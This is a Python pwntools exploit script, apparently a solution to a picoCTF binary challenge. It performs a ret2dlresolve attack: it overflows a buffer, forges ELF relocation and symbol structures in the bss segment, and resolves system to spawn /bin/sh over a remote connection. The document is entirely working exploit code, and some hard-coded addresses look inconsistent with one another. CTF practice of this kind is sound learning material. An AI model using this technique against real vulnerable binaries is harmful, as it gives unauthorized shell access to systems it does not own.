from pwn import *

host = 'mercury.picoctf.net'
port = 1774

libc = ELF('./libc.so.6')
elf = ELF('./vuln')
p = remote(host, port)

p.recvline()

p.sendline(b'random_shit')
p.recvline()

payload_size = 200
offset = 136

STRTAB 	 		= 0x400398
SYMTAB 	 		= 0x4002c0
JMPREL 	 		= 0x4004a0
bss 	 		= 0x601100
read_plt 		= 0x8049060
resolver_setup 	= 0x8049030
# Payload 1
# read into the writable bss segment
payload = b'A' * offset
payload += p32(read_plt)
payload += p32(elf.symbols['vuln'])
payload += p32(0x0)
payload += p32(bss)
payload += p32(payload_size)

p.send(payload)

fp = open('payload', 'wb+')
fp.write(payload)

system = b'system\x00'
binsh = b'/bin/sh\x00'

# first 8 bytes will have Elf32_Rel struct
elf_sym = bss + 0x8

# add extra characters so that difference between forged 
# Elf32_Sym struct and SYMTAB is divisible by 0x10
align = (0x10 - (elf_sym - SYMTAB) % 0x10) % 0x10
elf_sym += align

sym_index = (elf_sym - SYMTAB) // 0x10

# 'system' string will be places after Elf32_Sym struct
str_offset = (elf_sym + 0x10) - STRTAB

# forged r_info containing index into string placed by us
r_info = (sym_index << 8) | 0x7

elf_rel_struct = p32(elf.got['read']) + p32(r_info)
elf_sym_struct = p32(str_offset) + p32(0x1)*3
# Payload 2
payload = elf_rel_struct
payload += b'A' * align
payload += elf_sym_struct
payload += system

binsh_addr = bss + len(payload)
payload += binsh

# extend the length of payload to payload_size
payload += b'A' * (payload_size - len(payload))

fp.write(payload)
p.send(payload)

rel_offset = bss - JMPREL
# Payload 3
payload = b'A' * offset
payload += p32(resolver_setup)		# address to call
# 2nd argument to runtime resolver (1st is automatically placed by resolver_setup)
payload += p32(rel_offset)			
payload += p32(0xdeadbeef)			# junk return address
payload += p32(binsh_addr)			# when system is called argument should be top of stack

fp.write(payload)
p.send(payload)

# cat payload - | ./ret2dlresolve
# (cat payload ; cat) | ./ret2dlresolve
fp.close()
p.interactive()